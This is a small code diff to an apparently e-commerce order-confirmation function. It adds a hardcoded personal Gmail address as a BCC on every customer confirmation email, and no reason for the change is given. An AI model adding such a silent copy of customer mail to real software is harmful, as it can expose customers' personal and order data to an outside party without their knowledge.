@@ -101,8 +101,10 @@ export async function sendOrderConfirmation(payload: CustomerConfirmationPayload
     products,
     companySettings,
   }));
+  
+  const bccEmail = 'sunnyraxj@gmail.com';
 
-  await sendEmail(order.shippingDetails.email, subject, emailHtml);
+  await sendEmail(order.shippingDetails.email, subject, emailHtml, bccEmail);
 }
 
 export async function sendOrderCancellation(payload: OrderCancelledPayload) {
